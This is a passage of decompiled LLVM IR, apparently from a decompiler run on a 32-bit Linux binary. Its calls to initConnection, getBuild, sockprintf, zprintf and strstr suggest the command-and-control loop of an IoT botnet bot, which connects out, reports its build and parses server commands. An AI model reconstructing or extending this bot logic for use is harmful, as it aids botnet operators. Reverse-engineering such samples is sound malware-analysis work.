  %v1_805008b = ptrtoint i8* %v0_805008b to i32
  %v2_805008b = call i32 @sleep(i32 %v1_805008b)
  store i32 %v2_805008b, i32* %eax.global-to-local, align 4
  %v0_8050090 = load i32, i32* @esp, align 4
  %v2_8050090 = icmp ugt i32 %v0_8050090, -17
  store i1 %v2_8050090, i1* %cf.global-to-local, align 1
  %v0_805007d = call i32 @initConnection()
  store i32 %v0_805007d, i32* %eax.global-to-local, align 4
  %v1_8050082 = icmp eq i32 %v0_805007d, 0
  %v0_8050095 = load i32, i32* @esp, align 4
  %v5_8050095 = icmp ult i32 %v0_8050095, 12
  store i1 %v5_8050095, i1* %cf.global-to-local, align 1
  br i1 %v1_8050082, label %dec_label_pc_8050095, label %dec_label_pc_8050086

dec_label_pc_8050095:                             ; preds = %dec_label_pc_8050086, %dec_label_pc_805007d.outer
  %v0_8050095.lcssa = phi i32 [ %v0_8050095185, %dec_label_pc_805007d.outer ], [ %v0_8050095, %dec_label_pc_8050086 ]
  %v0_8050098 = load i32, i32* @global_var_80617a8.240, align 8
  %v2_8050098 = add i32 %v0_8050095.lcssa, -16
  %v3_8050098 = inttoptr i32 %v2_8050098 to i32*
  store i32 %v0_8050098, i32* %v3_8050098, align 4
  %v0_805009e = load i8*, i8** %stack_var_-5888, align 4
  %v1_805009e = ptrtoint i8* %v0_805009e to i32
  %v2_805009e = call i32 @__GI_inet_ntoa(i32 %v1_805009e)
  store i32 %v2_805009e, i32* %eax.global-to-local, align 4
  %v0_80500a3 = load i32, i32* @esp, align 4
  %v2_80500a3 = icmp ugt i32 %v0_80500a3, -17
  store i1 %v2_80500a3, i1* %cf.global-to-local, align 1
  store i32 %v2_805009e, i32* @ebx, align 4
  %v0_80500a8 = call i32 @getBuild()
  store i32 %v0_80500a8, i32* %eax.global-to-local, align 4
  %v0_80500ad = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_80500ad, i32* %edx.global-to-local, align 4
  %v0_80500b3 = load i32, i32* @ebx, align 4
  %v1_80500b3 = load i32, i32* @esp, align 4
  %v2_80500b3 = add i32 %v1_80500b3, -4
  %v3_80500b3 = inttoptr i32 %v2_80500b3 to i32*
  store i32 %v0_80500b3, i32* %v3_80500b3, align 4
  %v2_80500b4 = add i32 %v1_80500b3, -8
  %v3_80500b4 = inttoptr i32 %v2_80500b4 to i32*
  store i32 %v0_80500a8, i32* %v3_80500b4, align 4
  %v1_80500b5 = add i32 %v1_80500b3, -12
  %v2_80500b5 = inttoptr i32 %v1_80500b5 to i32*
  store i32 ptrtoint ([12 x i8]* @global_var_80591ce.457 to i32), i32* %v2_80500b5, align 4
  %v0_80500ba = load i32, i32* %edx.global-to-local, align 4
  %v2_80500ba = add i32 %v1_80500b3, -16
  %v3_80500ba = inttoptr i32 %v2_80500ba to i32*
  store i32 %v0_80500ba, i32* %v3_80500ba, align 4
  %v0_80500bb = load i8*, i8** %stack_var_-5888, align 4
  %v1_80500bb = ptrtoint i8* %v0_80500bb to i32
  %v3_80500bb = call i32 @sockprintf(i32 %v1_80500bb, i32 1)
  store i32 %v3_80500bb, i32* %eax.global-to-local, align 4
  %v0_80500c0 = load i32, i32* @esp, align 4
  %v1_80500c0 = add i32 %v0_80500c0, 16
  %v2_80500c0 = icmp ugt i32 %v0_80500c0, -17
  store i1 %v2_80500c0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050735.outer

dec_label_pc_80500e2:                             ; preds = %dec_label_pc_80502d7, %dec_label_pc_805028b
  %v2_80500e5 = mul i32 %storemerge17, 4
  store i32 %v2_80500e5, i32* %edx.global-to-local, align 4
  %v0_80500ea = load i32, i32* @global_var_80617b4.36, align 4
  %v2_80500ef = add i32 %v0_80500ea, %v2_80500e5
  store i32 %v2_80500ef, i32* %eax.global-to-local, align 4
  %v1_80500f2 = inttoptr i32 %v2_80500ef to i32*
  %v2_80500f2 = load i32, i32* %v1_80500f2, align 4
  store i32 %v2_80500f2, i32* %eax.global-to-local, align 4
  %tmp261 = and i32 %v0_80500f4.in, -4
  %v5_80500f4 = icmp eq i32 %tmp261, -16
  store i1 %v5_80500f4, i1* %cf.global-to-local, align 1
  %v1_80500f7 = add i32 %v0_80500f4.in, 8
  %v2_80500f7 = inttoptr i32 %v1_80500f7 to i32*
  store i32 1, i32* %v2_80500f7, align 4
  %v1_80500f9 = add i32 %v0_80500f4.in, 4
  %v2_80500f9 = inttoptr i32 %v1_80500f9 to i32*
  store i32 0, i32* %v2_80500f9, align 4
  %v0_80500fb = load i32, i32* %eax.global-to-local, align 4
  %v3_80500fb = inttoptr i32 %v0_80500f4.in to i32*
  store i32 %v0_80500fb, i32* %v3_80500fb, align 4
  %v4_80500fc = call i32 @__libc_waitpid(i32 %storemerge17, i32 %v2_80500fc, i32 %stack_var_-60.2)
  store i32 %v4_80500fc, i32* %eax.global-to-local, align 4
  %v0_8050101 = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp170 = icmp slt i32 %v4_80500fc, 1
  %.pre = add i32 %storemerge17, 1
  br i1 %tmp170, label %dec_label_pc_8050288, label %dec_label_pc_805010c

dec_label_pc_805010c:                             ; preds = %dec_label_pc_80500e2
  store i32 %.pre, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805013f

dec_label_pc_8050115:                             ; preds = %dec_label_pc_805013f, %dec_label_pc_8050179
  %v2_8050118 = mul i32 %storemerge19, 4
  %v0_805011d = load i32, i32* @global_var_80617b4.36, align 4
  %v2_8050122 = add i32 %v0_805011d, %v2_8050118
  %v1_8050125 = add i32 %v2_8050122, -4
  store i32 %v2_8050118, i32* %edx.global-to-local, align 4
  store i32 %v2_8050122, i32* %eax.global-to-local, align 4
  %v1_8050138 = inttoptr i32 %v2_8050122 to i32*
  %v2_8050138 = load i32, i32* %v1_8050138, align 4
  store i32 %v2_8050138, i32* %eax.global-to-local, align 4
  %v2_805013a = inttoptr i32 %v1_8050125 to i32*
  store i32 %v2_8050138, i32* %v2_805013a, align 4
  %v4_805013c = add i32 %storemerge19, 1
  br label %dec_label_pc_805013f

dec_label_pc_805013f:                             ; preds = %dec_label_pc_805010c, %dec_label_pc_8050115
  %storemerge19 = phi i32 [ %v4_805013c, %dec_label_pc_8050115 ], [ %.pre, %dec_label_pc_805010c ]
  store i32 %storemerge19, i32* %eax.global-to-local, align 4
  %v0_8050153 = load i32, i32* @global_var_805b528.34, align 8
  store i32 %v0_8050153, i32* %edx.global-to-local, align 4
  %v0_8050159 = load i32, i32* @global_var_805b52c.35, align 4
  %v10_8050171 = icmp eq i32 %v0_8050159, 0
  br i1 %v10_8050171, label %dec_label_pc_8050179, label %dec_label_pc_8050115

dec_label_pc_8050179:                             ; preds = %dec_label_pc_805013f
  store i32 0, i32* @esi, align 4
  store i32 %v0_8050153, i32* @edi, align 4
  %v10_805018d = icmp ult i32 %storemerge19, %v0_8050153
  br i1 %v10_805018d, label %dec_label_pc_8050115, label %dec_label_pc_8050195

dec_label_pc_8050195:                             ; preds = %dec_label_pc_8050179
  %v2_8050198 = mul i32 %storemerge19, 4
  %v0_805019d = load i32, i32* @global_var_80617b4.36, align 4
  %v2_80501a2 = add i32 %v2_8050198, -4
  %v1_80501a5 = add i32 %v2_80501a2, %v0_805019d
  %v1_80501a8 = inttoptr i32 %v1_80501a5 to i32*
  store i32 0, i32* %v1_80501a8, align 4
  %v0_80501ae = load i32, i32* @global_var_805b528.34, align 8
  %v0_80501b3 = load i32, i32* @global_var_805b52c.35, align 4
  %v1_80501b9 = add i32 %v0_80501ae, -1
  %v4_80501b9 = icmp ne i32 %v0_80501ae, 0
  %v2_80501bc = zext i1 %v4_80501b9 to i32
  %v3_80501bc = add i32 %v0_80501b3, -1
  %v4_80501bc = add i32 %v3_80501bc, %v2_80501bc
  store i32 %v1_80501b9, i32* @global_var_805b528.34, align 8
  store i32 %v4_80501bc, i32* @global_var_805b52c.35, align 4
  %v3_80501d5 = mul i32 %v4_80501bc, 4
  %v4_80501d5 = udiv i32 %v1_80501b9, 1073741824
  %v5_80501d5 = or i32 %v3_80501d5, %v4_80501d5
  store i32 %v5_80501d5, i32* %edx.global-to-local, align 4
  %v2_80501d9 = mul i32 %v1_80501b9, 4
  %v1_80501dc = add i32 %v2_80501d9, 4
  store i32 %v1_80501dc, i32* %eax.global-to-local, align 4
  %v0_80501df = load i32, i32* @esp, align 4
  %v5_80501df = icmp ult i32 %v0_80501df, 12
  store i1 %v5_80501df, i1* %cf.global-to-local, align 1
  %v2_80501e2 = add i32 %v0_80501df, -16
  %v3_80501e2 = inttoptr i32 %v2_80501e2 to i32*
  store i32 %v1_80501dc, i32* %v3_80501e2, align 4
  %v1_80501e3 = call i32 @malloc(i32 0)
  store i32 %v1_80501e3, i32* %eax.global-to-local, align 4
  %v0_80501e8 = load i32, i32* @esp, align 4
  %v2_80501e8 = icmp ugt i32 %v0_80501e8, -17
  store i1 %v2_80501e8, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050219

dec_label_pc_80501f7:                             ; preds = %dec_label_pc_8050219, %dec_label_pc_8050253
  %v2_80501fa = mul i32 %storemerge18, 4
  %v5_80501ff = add i32 %v2_80501fa, %v1_80501e3
  store i32 %v2_80501fa, i32* %edx.global-to-local, align 4
  %v0_805020a = load i32, i32* @global_var_80617b4.36, align 4
  %v2_805020f = add i32 %v0_805020a, %v2_80501fa
  store i32 %v2_805020f, i32* %eax.global-to-local, align 4
  %v1_8050212 = inttoptr i32 %v2_805020f to i32*
  %v2_8050212 = load i32, i32* %v1_8050212, align 4
  store i32 %v2_8050212, i32* %eax.global-to-local, align 4
  %v2_8050214 = inttoptr i32 %v5_80501ff to i32*
  store i32 %v2_8050212, i32* %v2_8050214, align 4
  %v4_8050216 = add i32 %storemerge18, 1
  br label %dec_label_pc_8050219

dec_label_pc_8050219:                             ; preds = %dec_label_pc_8050195, %dec_label_pc_80501f7
  %storemerge18 = phi i32 [ %v4_8050216, %dec_label_pc_80501f7 ], [ 0, %dec_label_pc_8050195 ]
  store i32 %storemerge18, i32* %eax.global-to-local, align 4
  %v0_805022d = load i32, i32* @global_var_805b528.34, align 8
  store i32 %v0_805022d, i32* %edx.global-to-local, align 4
  %v0_8050233 = load i32, i32* @global_var_805b52c.35, align 4
  %v10_805024b = icmp eq i32 %v0_8050233, 0
  br i1 %v10_805024b, label %dec_label_pc_8050253, label %dec_label_pc_80501f7

dec_label_pc_8050253:                             ; preds = %dec_label_pc_8050219
  store i32 0, i32* @esi, align 4
  store i32 %v0_805022d, i32* @edi, align 4
  %v10_8050267 = icmp ult i32 %storemerge18, %v0_805022d
  br i1 %v10_8050267, label %dec_label_pc_80501f7, label %dec_label_pc_805026f

dec_label_pc_805026f:                             ; preds = %dec_label_pc_8050253
  %v0_805026f = load i32, i32* @global_var_80617b4.36, align 4
  store i32 %v0_805026f, i32* %eax.global-to-local, align 4
  %v0_8050274 = load i32, i32* @esp, align 4
  %v5_8050274 = icmp ult i32 %v0_8050274, 12
  store i1 %v5_8050274, i1* %cf.global-to-local, align 1
  %v2_8050277 = add i32 %v0_8050274, -16
  %v3_8050277 = inttoptr i32 %v2_8050277 to i32*
  store i32 %v0_805026f, i32* %v3_8050277, align 4
  %v1_8050278 = call i32 @free(i32 0)
  %v0_805027d = load i32, i32* @esp, align 4
  %v2_805027d = icmp ugt i32 %v0_805027d, -17
  store i1 %v2_805027d, i1* %cf.global-to-local, align 1
  store i32 %v1_80501e3, i32* %eax.global-to-local, align 4
  store i32 %v1_80501e3, i32* @global_var_80617b4.36, align 4
  br label %dec_label_pc_8050288

dec_label_pc_8050288:                             ; preds = %dec_label_pc_80500e2, %dec_label_pc_805026f
  %v0_80500f480.in = phi i32 [ %v0_805027d, %dec_label_pc_805026f ], [ %v0_8050101, %dec_label_pc_80500e2 ]
  %stack_var_-60.1 = phi i32 [ %v1_80501e3, %dec_label_pc_805026f ], [ %stack_var_-60.2, %dec_label_pc_80500e2 ]
  br label %dec_label_pc_805028b

dec_label_pc_805028b:                             ; preds = %dec_label_pc_8050735, %dec_label_pc_8050288
  %v0_80500f4.in = phi i32 [ %v0_80500f480.in, %dec_label_pc_8050288 ], [ %v0_8050750, %dec_label_pc_8050735 ]
  %stack_var_-60.2 = phi i32 [ %stack_var_-60.1, %dec_label_pc_8050288 ], [ %stack_var_-60.3, %dec_label_pc_8050735 ]
  %storemerge17 = phi i32 [ %.pre, %dec_label_pc_8050288 ], [ 0, %dec_label_pc_8050735 ]
  store i32 %storemerge17, i32* %eax.global-to-local, align 4
  %v2_8050296 = ashr i32 %storemerge17, 31
  store i32 %v2_8050296, i32* %edx.global-to-local, align 4
  %v0_805029f = load i32, i32* @global_var_805b528.34, align 8
  store i32 %v0_805029f, i32* @esi, align 4
  %v0_80502a5 = load i32, i32* @global_var_805b52c.35, align 4
  store i32 %v0_80502a5, i32* @edi, align 4
  %v10_80502bd = icmp ult i32 %v2_8050296, %v0_80502a5
  store i1 %v10_80502bd, i1* %cf.global-to-local, align 1
  br i1 %v10_80502bd, label %dec_label_pc_80500e2, label %dec_label_pc_80502c9

dec_label_pc_80502c9:                             ; preds = %dec_label_pc_805028b
  store i32 %v0_80502a5, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v6_80502d5 = icmp ugt i32 %v2_8050296, %v0_80502a5
  br i1 %v6_80502d5, label %dec_label_pc_80502e9, label %dec_label_pc_80502d7

dec_label_pc_80502d7:                             ; preds = %dec_label_pc_80502c9
  store i32 %v0_805029f, i32* %edx.global-to-local, align 4
  %v10_80502dd = icmp ult i32 %storemerge17, %v0_805029f
  store i1 %v10_80502dd, i1* %cf.global-to-local, align 1
  br i1 %v10_80502dd, label %dec_label_pc_80500e2, label %dec_label_pc_80502e9

dec_label_pc_80502e9:                             ; preds = %dec_label_pc_80502d7, %dec_label_pc_80502c9
  %v0_80502ec = load i32, i32* @ebp, align 4
  %v2_80502ec = add i32 %v0_805074b, -5736
  %v3_80502ec = add i32 %v2_80502ec, %v0_80502ec
  %v4_80502ec = inttoptr i32 %v3_80502ec to i8*
  store i8 0, i8* %v4_80502ec, align 1
  %v0_80502f4 = load i32, i32* @esp, align 4
  %v5_80502f4 = icmp ult i32 %v0_80502f4, 12
  store i1 %v5_80502f4, i1* %cf.global-to-local, align 1
  store i32 %v2_8050735, i32* %eax.global-to-local, align 4
  %v2_80502fd = add i32 %v0_80502f4, -16
  %v3_80502fd = inttoptr i32 %v2_80502fd to i32*
  store i32 %v2_8050735, i32* %v3_80502fd, align 4
  %v0_80502fe = call i32 @trim()
  %v0_8050303 = load i32, i32* @esp, align 4
  %tmp255 = and i32 %v0_8050303, -8
  %v5_8050306 = icmp eq i32 %tmp255, -16
  store i1 %v5_8050306, i1* %cf.global-to-local, align 1
  %v1_8050309 = add i32 %v0_8050303, 4
  %v2_8050309 = inttoptr i32 %v1_8050309 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8057f37.21 to i32), i32* %v2_8050309, align 4
  store i32 %v2_8050735, i32* %eax.global-to-local, align 4
  %v3_8050314 = inttoptr i32 %v0_8050303 to i32*
  store i32 %v2_8050735, i32* %v3_8050314, align 4
  %v3_8050315 = call i32 @strstr(i32 %v0_80502a5, i8* bitcast (i32* @0 to i8*))
  %v0_805031a = load i32, i32* @esp, align 4
  %v1_805031a = add i32 %v0_805031a, 16
  store i32 %v3_8050315, i32* %edx.global-to-local, align 4
  store i32 %v2_8050735, i32* %eax.global-to-local, align 4
  %v7_8050325 = icmp ult i32 %v3_8050315, %v2_8050735
  store i1 %v7_8050325, i1* %cf.global-to-local, align 1
  %v12_8050325 = icmp eq i32 %v3_8050315, %v2_8050735
  %v1_8050327 = icmp eq i1 %v12_8050325, false
  br i1 %v1_8050327, label %dec_label_pc_8050344, label %dec_label_pc_8050329

dec_label_pc_8050329:                             ; preds = %dec_label_pc_80502e9
  %v0_8050329 = load i32, i32* @global_var_805b520.20, align 32
  store i32 %v0_8050329, i32* %eax.global-to-local, align 4
  %v5_805032e = icmp ult i32 %v1_805031a, 8
  store i1 %v5_805032e, i1* %cf.global-to-local, align 1
  %v1_8050331 = add i32 %v0_805031a, 4
  %v2_8050331 = inttoptr i32 %v1_8050331 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80591da.458 to i32), i32* %v2_8050331, align 4
  %v0_8050336 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050336 = inttoptr i32 %v0_805031a to i32*
  store i32 %v0_8050336, i32* %v3_8050336, align 4
  %v2_8050337 = call i32 @sockprintf(i32 %v0_80502a5, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8050337, i32* %eax.global-to-local, align 4
  %v0_805033c = load i32, i32* @esp, align 4
  %v1_805033c = add i32 %v0_805033c, 16
  %v2_805033c = icmp ugt i32 %v0_805033c, -17
  store i1 %v2_805033c, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050735

dec_label_pc_8050344:                             ; preds = %dec_label_pc_80502e9
  %v5_8050344 = icmp ult i32 %v1_805031a, 8
  store i1 %v5_8050344, i1* %cf.global-to-local, align 1
  %v1_8050347 = add i32 %v0_805031a, 4
  %v2_8050347 = inttoptr i32 %v1_8050347 to i32*
  store i32 ptrtoint ([4 x i8]* @global_var_80591df.459 to i32), i32* %v2_8050347, align 4
  store i32 %v2_8050735, i32* %eax.global-to-local, align 4
  %v3_8050352 = inttoptr i32 %v0_805031a to i32*
  store i32 %v2_8050735, i32* %v3_8050352, align 4
  %v3_8050353 = call i32 @strstr(i32 %v0_80502a5, i8* bitcast (i32* @0 to i8*))
  %v0_8050358 = load i32, i32* @esp, align 4
  store i32 %v3_8050353, i32* @edx, align 4
  store i32 %v2_8050735, i32* %eax.global-to-local, align 4
  %v7_8050363 = icmp ult i32 %v3_8050353, %v2_8050735
  store i1 %v7_8050363, i1* %cf.global-to-local, align 1
  %v12_8050363 = icmp eq i32 %v3_8050353, %v2_8050735
  %v1_8050365 = icmp eq i1 %v12_8050363, false
  br i1 %v1_8050365, label %dec_label_pc_805038f, label %dec_label_pc_8050367

dec_label_pc_8050367:                             ; preds = %dec_label_pc_8050344
  %v1_8050358 = add i32 %v0_8050358, 16
  %v4_8050367 = add i32 %stack_var_-96.2.ph29, 1
  store i32 ptrtoint ([20 x i8]* @global_var_80591e3.460 to i32), i32* %eax.global-to-local, align 4
  %v5_805036f = icmp ult i32 %v1_8050358, 12
  store i1 %v5_805036f, i1* %cf.global-to-local, align 1
  %v3_8050372 = inttoptr i32 %v0_8050358 to i32*
  store i32 ptrtoint ([20 x i8]* @global_var_80591e3.460 to i32), i32* %v3_8050372, align 4
  %v1_8050373 = call i32 @zprintf(i32 %v4_8050367)
  store i32 %v1_8050373, i32* @eax, align 4
  %v0_8050378 = load i32, i32* @esp, align 4
  %v9_805037b = icmp ult i32 %v4_8050367, 20
  store i1 %v9_805037b, i1* %cf.global-to-local, align 1
  %v7_805037f = icmp sgt i32 %v4_8050367, 20
  br i1 %v7_805037f, label %dec_label_pc_8050385, label %dec_label_pc_805007d.outer

dec_label_pc_8050385:                             ; preds = %dec_label_pc_8050367
  %v1_8050378 = add i32 %v0_8050378, 16
  %v5_8050385 = icmp ult i32 %v1_8050378, 12
  store i1 %v5_8050385, i1* %cf.global-to-local, align 1
  %v2_8050388 = inttoptr i32 %v0_8050378 to i32*
  store i32 0, i32* %v2_8050388, align 4
  %v1_805038a = call i32 @__GI_exit(i32 %v4_8050367)
  store i32 %v1_805038a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805038f

dec_label_pc_805038f:                             ; preds = %dec_label_pc_8050344, %dec_label_pc_8050385
  %stack_var_-96.1 = phi i32 [ %stack_var_-96.2.ph29, %dec_label_pc_8050344 ], [ %v4_8050367, %dec_label_pc_8050385 ]
  %v2_805039b = load i8, i8* %tmp168, align 4
  %v3_805039b = zext i8 %v2_805039b to i32
  %v6_805039b = or i32 %v3_805039b, %v5_805039b
  store i32 %v6_805039b, i32* %eax.global-to-local, align 4
  %v6_805039d = icmp ult i8 %v2_805039b, 33
  store i1 %v6_805039d, i1* %cf.global-to-local, align 1
  %v10_805039d = icmp eq i8 %v2_805039b, 33
  %v1_805039f = icmp eq i1 %v10_805039d, false
  br i1 %v1_805039f, label %dec_label_pc_8050735.outer26.backedge, label %dec_label_pc_80503a5

dec_label_pc_8050735.outer26.backedge:            ; preds = %dec_label_pc_805038f, %dec_label_pc_80503c3, %dec_label_pc_80506e9, %dec_label_pc_805051b
  %stack_var_-64.2.ph27.be = phi i8* [ %v22_805049e, %dec_label_pc_805051b ], [ %v22_805049e, %dec_label_pc_80506e9 ], [ %tmp168, %dec_label_pc_80503c3 ], [ %tmp168, %dec_label_pc_805038f ]
  %v0_8050741.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050735.outer26

dec_label_pc_80503a5:                             ; preds = %dec_label_pc_805038f
  store i32 %v1_80503a8, i32* %eax.global-to-local, align 4
  %v2_80503b4191 = load i8, i8* %storemerge16190, align 1
  %v3_80503b4192 = zext i8 %v2_80503b4191 to i32
  %v6_80503b4194 = or i32 %v3_80503b4192, %v5_805039b
  store i32 %v6_80503b4194, i32* %eax.global-to-local, align 4
  %v3_80503b6195 = icmp ult i8 %v2_80503b4191, 32
  store i1 %v3_80503b6195, i1* %cf.global-to-local, align 1
  %v7_80503b6196 = icmp eq i8 %v2_80503b4191, 32
  br i1 %v7_80503b6196, label %dec_label_pc_80503c3, label %dec_label_pc_80503ba

dec_label_pc_80503ae:                             ; preds = %dec_label_pc_80503ba
  %v5_80503ae = add i32 %storemerge16.in197, 1
  %storemerge16 = inttoptr i32 %v5_80503ae to i8*
  store i32 %v5_80503ae, i32* %eax.global-to-local, align 4
  %v2_80503b4 = load i8, i8* %storemerge16, align 1
  %v3_80503b4 = zext i8 %v2_80503b4 to i32
  %v5_80503b4 = and i32 %v5_80503ae, -256
  %v6_80503b4 = or i32 %v3_80503b4, %v5_80503b4
  store i32 %v6_80503b4, i32* %eax.global-to-local, align 4
  %v3_80503b6 = icmp ult i8 %v2_80503b4, 32
  store i1 %v3_80503b6, i1* %cf.global-to-local, align 1
  %v7_80503b6 = icmp eq i8 %v2_80503b4, 32
  br i1 %v7_80503b6, label %dec_label_pc_80503c3, label %dec_label_pc_80503ba

dec_label_pc_80503ba:                             ; preds = %dec_label_pc_80503a5, %dec_label_pc_80503ae
  %v5_80503b4199 = phi i32 [ %v5_80503b4, %dec_label_pc_80503ae ], [ %v5_805039b, %dec_label_pc_80503a5 ]
  %storemerge16198 = phi i8* [ %storemerge16, %dec_label_pc_80503ae ], [ %storemerge16190, %dec_label_pc_80503a5 ]
  %storemerge16.in197 = phi i32 [ %v5_80503ae, %dec_label_pc_80503ae ], [ %v1_80503a8, %dec_label_pc_80503a5 ]
  store i32 %storemerge16.in197, i32* %eax.global-to-local, align 4
  %v2_80503bd = load i8, i8* %storemerge16198, align 1
  %v3_80503bd = zext i8 %v2_80503bd to i32
  %v6_80503bd = or i32 %v3_80503bd, %v5_80503b4199
  store i32 %v6_80503bd, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80503bf = icmp eq i8 %v2_80503bd, 0
  %v1_80503c1 = icmp eq i1 %v4_80503bf, false
  br i1 %v1_80503c1, label %dec_label_pc_80503ae, label %dec_label_pc_80503c3

dec_label_pc_80503c3:                             ; preds = %dec_label_pc_80503ae, %dec_label_pc_80503ba, %dec_label_pc_80503a5
  %storemerge16.in.lcssa = phi i32 [ %v1_80503a8, %dec_label_pc_80503a5 ], [ %storemerge16.in197, %dec_label_pc_80503ba ], [ %v5_80503ae, %dec_label_pc_80503ae ]
  %storemerge16.lcssa = phi i8* [ %storemerge16190, %dec_label_pc_80503a5 ], [ %storemerge16198, %dec_label_pc_80503ba ], [ %storemerge16, %dec_label_pc_80503ae ]
  %v5_80503b4.lcssa = phi i32 [ %v5_805039b, %dec_label_pc_80503a5 ], [ %v5_80503b4199, %dec_label_pc_80503ba ], [ %v5_80503b4, %dec_label_pc_80503ae ]
  store i32 %storemerge16.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_80503c6 = load i8, i8* %storemerge16.lcssa, align 1
  %v3_80503c6 = zext i8 %v2_80503c6 to i32
  %v6_80503c6 = or i32 %v3_80503c6, %v5_80503b4.lcssa
  store i32 %v6_80503c6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_80503c8 = icmp eq i8 %v2_80503c6, 0
  br i1 %v4_80503c8, label %dec_label_pc_8050735.outer26.backedge, label %dec_label_pc_80503d0

dec_label_pc_80503d0:                             ; preds = %dec_label_pc_80503c3
  store i8 0, i8* %storemerge16.lcssa, align 1
  store i32 %v5_805039b, i32* %eax.global-to-local, align 4
  %v3_80503f4 = call i32 @_strlen(i8* %storemerge16190)
  %v6_80503fb = add i32 %v2_8050735, %v3_80503f4
  %v1_80503fe = add i32 %v6_80503fb, 2
  %v5_80503fe = icmp ugt i32 %v6_80503fb, -3
  store i1 %v5_80503fe, i1* %cf.global-to-local, align 1
  store i32 %v1_80503fe, i32* %eax.global-to-local, align 4
  %v5_8050401 = inttoptr i32 %v1_80503fe to i8*
  %v1_8050439 = and i32 %v1_80503fe, -256
  br label %dec_label_pc_805042b

dec_label_pc_8050406:                             ; preds = %dec_label_pc_8050453, %dec_label_pc_805042b
  store i32 %v1_8050439, i32* %eax.global-to-local, align 4
  %v3_805041d = call i32 @_strlen(i8* %v5_8050401)
  %v4_805041d = mul i32 %v3_805041d, -1
  %v1_8050423 = sub i32 0, %v4_805041d
  %v6_8050424 = sub i32 %v1_80503fe, %v4_805041d
  %v11_8050424 = icmp ult i32 %v6_8050424, %v1_8050423
  store i1 %v11_8050424, i1* %cf.global-to-local, align 1
  %v1_8050427 = add i32 %v6_8050424, -1
  store i32 %v1_8050427, i32* %eax.global-to-local, align 4
  %v1_8050428 = inttoptr i32 %v1_8050427 to i8*
  store i8 0, i8* %v1_8050428, align 1
  br label %dec_label_pc_805042b

dec_label_pc_805042b:                             ; preds = %dec_label_pc_80503d0, %dec_label_pc_8050406
  store i32 %v1_8050439, i32* %eax.global-to-local, align 4
  %v3_8050442 = call i32 @_strlen(i8* %v5_8050401)
  %v4_8050442 = mul i32 %v3_8050442, -1
  %v1_8050448 = sub i32 0, %v4_8050442
  %v6_8050449 = sub i32 %v1_80503fe, %v4_8050442
  %v11_8050449 = icmp ult i32 %v6_8050449, %v1_8050448
  store i1 %v11_8050449, i1* %cf.global-to-local, align 1
  %v1_805044c = add i32 %v6_8050449, -1
  store i32 %v1_805044c, i32* %eax.global-to-local, align 4
  %v1_805044d = inttoptr i32 %v1_805044c to i8*
  %v2_805044d = load i8, i8* %v1_805044d, align 1
  %v3_805044d = zext i8 %v2_805044d to i32
  %v5_805044d = and i32 %v1_805044c, -256
  %v6_805044d = or i32 %v3_805044d, %v5_805044d
  store i32 %v6_805044d, i32* %eax.global-to-local, align 4
  %v6_805044f = icmp ult i8 %v2_805044d, 10
  store i1 %v6_805044f, i1* %cf.global-to-local, align 1
  %v10_805044f = icmp eq i8 %v2_805044d, 10
  br i1 %v10_805044f, label %dec_label_pc_8050406, label %dec_label_pc_8050453

dec_label_pc_8050453:                             ; preds = %dec_label_pc_805042b
  store i32 %v1_8050439, i32* %eax.global-to-local, align 4
  %v3_805046a = call i32 @_strlen(i8* %v5_8050401)
  %v4_805046a = mul i32 %v3_805046a, -1
  %v1_8050470 = sub i32 0, %v4_805046a
  %v6_8050471 = sub i32 %v1_80503fe, %v4_805046a
  %v11_8050471 = icmp ult i32 %v6_8050471, %v1_8050470
  store i1 %v11_8050471, i1* %cf.global-to-local, align 1
  %v1_8050474 = add i32 %v6_8050471, -1
  store i32 %v1_8050474, i32* %eax.global-to-local, align 4
  %v1_8050475 = inttoptr i32 %v1_8050474 to i8*
  %v2_8050475 = load i8, i8* %v1_8050475, align 1
  %v3_8050475 = zext i8 %v2_8050475 to i32
  %v5_8050475 = and i32 %v1_8050474, -256
  %v6_8050475 = or i32 %v3_8050475, %v5_8050475
  store i32 %v6_8050475, i32* %eax.global-to-local, align 4
  %v6_8050477 = icmp ult i8 %v2_8050475, 13
  store i1 %v6_8050477, i1* %cf.global-to-local, align 1
  %v10_8050477 = icmp eq i8 %v2_8050475, 13
  br i1 %v10_8050477, label %dec_label_pc_8050406, label %dec_label_pc_805047b

dec_label_pc_805047b:                             ; preds = %dec_label_pc_8050453
  store i32 %v1_80503fe, i32* %eax.global-to-local, align 4
  %v2_8050489207 = load i8, i8* %v5_8050401, align 1
  %v3_8050489208 = zext i8 %v2_8050489207 to i32
  %v6_8050489210 = or i32 %v3_8050489208, %v1_8050439
  store i32 %v6_8050489210, i32* %eax.global-to-local, align 4
  %v3_805048b211 = icmp ult i8 %v2_8050489207, 32
  store i1 %v3_805048b211, i1* %cf.global-to-local, align 1
  %v7_805048b212 = icmp eq i8 %v2_8050489207, 32
  br i1 %v7_805048b212, label %dec_label_pc_8050498, label %dec_label_pc_805048f

dec_label_pc_8050483:                             ; preds = %dec_label_pc_805048f
  %v5_8050483 = add i32 %v4_8050486214, 1
  %v22_8050483 = inttoptr i32 %v5_8050483 to i8*
  store i32 %v5_8050483, i32* %eax.global-to-local, align 4
  %v2_8050489 = load i8, i8* %v22_8050483, align 1
  %v3_8050489 = zext i8 %v2_8050489 to i32
  %v5_8050489 = and i32 %v5_8050483, -256
  %v6_8050489 = or i32 %v3_8050489, %v5_8050489
  store i32 %v6_8050489, i32* %eax.global-to-local, align 4
  %v3_805048b = icmp ult i8 %v2_8050489, 32
  store i1 %v3_805048b, i1* %cf.global-to-local, align 1
  %v7_805048b = icmp eq i8 %v2_8050489, 32
